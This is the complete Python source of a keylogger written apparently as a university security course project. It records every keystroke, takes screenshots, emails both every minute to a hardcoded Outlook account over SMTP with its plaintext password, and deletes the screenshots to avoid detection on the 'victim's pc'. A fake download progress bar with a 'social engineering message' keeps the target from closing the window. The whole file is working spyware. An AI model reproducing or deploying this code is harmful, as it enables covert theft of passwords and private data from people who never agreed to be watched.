############################################################################
#                                                                          #
#            SOMETHING AWESOME PROJECT by Tam Do z5312910                  #
#                                                                          #
############################################################################

# To keep track of Keylogs
import keyboard

# To send emails using SMTP protocol
import smtplib

# Timers
from threading import Timer
from datetime import datetime

# For the email sending
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

# For the screenshot capture
from PIL import ImageGrab
import time
import os

# For the download animation
import sys
import random

# For multi-threading
import threading

# Change this depending on how often you want emails (seconds)
SEND_REPORT_EVERY = 60

# Login credentials
EMAIL_ADDRESS = "comp6441test@outlook.com"
EMAIL_PASSWORD = "COMP6441"

# Lists of tech-related words and extensions
tech_words = ["code", "program", "data", "byte", "app", "cloud", "server", "web", "cyber", "logic", "net", "matrix", "robot", "bit", "chip", "AI", "byte", "crypto", "pixel"]
file_extensions = [".txt", ".doc", ".jpg", ".png", ".exe", ".html", ".csv", ".log"]

# Define the class of the keyloggers with all the methods
class Keylogger:

    def __init__(self, interval, report_method="email"):
        
        # Initialise everything
        self.interval = interval
        self.report_method = report_method

        # This is where the keystrokes are kept
        self.log = ""

        # Initialise the timers
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):

        """
        This event occurs when a keystroke occurs
        """

        name = event.name

        # Check if it is a special key e.g ctrl, alt, shift
        if len(name) > 1:

            if name == "space":
                # Put a space
                name = " "
            elif name == "enter":
                # Put a new line
                name = "[ENTER]\n"
            elif name == "decimal":
                # Put a dot
                name = "."
            else:
                # Make the special key uppercase in square brackets
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        # Add the key to the keystrokes string
        self.log += name

    def update_filename(self):

        """
        Function to change file name to the time so it is logged more efficiently
        """

        # Construct filename to be start and end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):

        """
        Function to create file that contains the keylogs
        """

        # Open file and write in it
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)

        # Confirmation of saved file (For personal use, comment code below if not)
        # print(f"[+] Saved {self.filename}.txt")
    
    def prepare_mail(self, message, screenshot_path):

        """
        Function to construct a MIMEMultipart from a text
        to be sent as an email along with screenshot
        """

        # Add the email details
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"

        # Create a text message
        text_part = MIMEText(message, "plain")
        msg.attach(text_part)

        # Attach the screenshot as a file
        with open(screenshot_path, "rb") as screenshot_file:
            screenshot_data = screenshot_file.read()
            screenshot_part = MIMEApplication(screenshot_data, _subtype="png") 
            screenshot_part['Content-Disposition'] = f'attachment; filename="screenshot.png"'
            msg.attach(screenshot_part)

        return msg

    def sendmail(self, email, password, message, screenshot_path):

        """
        Function to send email using a smtp server
        """

        # Connect to server and log in
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        
        # Prepare the email message
        email_message = self.prepare_mail(message, screenshot_path)
        
        # Convert the message to bytes
        email_message_bytes = email_message.as_bytes()
        
        # Send the email
        server.sendmail(email, email, email_message_bytes)
        server.quit()

        # Confirmation email was sent (For personal use, comment code below if not)
        # print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

        # Delete the screenshot to avoid detection and taking up memory on victim's pc
        os.remove(screenshot_path)
    
    def capture_screenshot(self):

        """
        Function to capture a screenshot
        """

        # Screenshot the screen
        screenshot = ImageGrab.grab()  

        # Save the screenshot to a file
        screenshot_path = f"screenshot-{time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
        screenshot.save(screenshot_path)

        # Return the path to the saved screenshot
        return screenshot_path
    
    def report(self):

        """
        Function is called every set interval (from above)
        Calls on other functions to send the email and resets the keystrokes string
        """

        # If the keystrokes string is not empty, report the contents
        if self.log:
            
            # Capture a screenshot
            screenshot_path = self.capture_screenshot()
            self.end_dt = datetime.now()

            # Update filename
            self.update_filename()

            # Check method of delivery (email or file)
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log, screenshot_path)
            elif self.report_method == "file":
                self.report_to_file()
            
            # Reset timer
            self.start_dt = datetime.now()

        # Reset the keystrokes string and timer
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)

        # Set the thread as daemon (dies when main thread die)
        timer.daemon = True

        # Start timer
        timer.start()

    def start(self):

        """
        Function to start keylogger
        """

        # Record start datetime
        self.start_dt = datetime.now()

        # Start the keylogger
        keyboard.on_release(callback=self.callback)

        # Start reporting the keylogs
        self.report()

        # Simple message to console (For personal use, comment code below if not)
        # print(f"{datetime.now()} - Started keylogger")

        # Block the current thread until CTRL+C is pressed
        keyboard.wait()

def generate_tech_filename():

    """
    Generates a phoney file that was donwloaded or updated for the animation
    """

    prefix = random.choice(tech_words)
    number_suffix = f"{random.randint(1, 9):02d}"
    extension = random.choice(file_extensions)
    
    # Combine the words, number, and extension to create the filename
    filename = f"{prefix}_{number_suffix}{extension}"
    
    return filename

def download_animation():

    """
    Creates a fake download animation in the terminal that goes on forever
    """

    # Chooses random time between 30 to 120 seconds for the progress bar to charge up
    total_time = random.uniform(30, 120)
    start_time = time.time()
    random.seed()

    # Social engineering message :)
    print("Please do not close this window, leave it running in the background")
    print("Downloading...")
    
    # Reset the start time when the progress bar fills up
    while True:
        elapsed_time = time.time() - start_time
        if elapsed_time >= total_time:
            start_time = time.time()  
            progress = 0
            
            filename = generate_tech_filename()

            sys.stdout.write(f"\r[..........................................] COMPLETED {filename}\n")
            sys.stdout.flush()
            # Pause for a moment till next progress bar
            time.sleep(2)

            # Randomise the total_time again
            total_time = random.uniform(30, 120)
        else:
            progress = elapsed_time / total_time
            num_blocks = int(40 * progress)
        
            sys.stdout.write("\r[" + "=" * num_blocks + " " * (40 - num_blocks) + f"] {int(progress * 100)}%")
            sys.stdout.flush()

            # Randomise how fast the progress bar fills up
            random_update_interval = random.uniform(0.1, 1.0)
            time.sleep(random_update_interval)
    
if __name__ == "__main__":

    # Change report_method to "file" if you want a file output, "email" to receive emails
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")

    # Start a thread for keylogger
    keylogger_thread = threading.Thread(target=keylogger.start)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    # Start a thread for bogus download animation
    download_thread = threading.Thread(target=download_animation)
    download_thread.daemon = True
    download_thread.start()

    # Wait for threads to finish before the program exits
    keylogger_thread.join()
    download_thread.join()
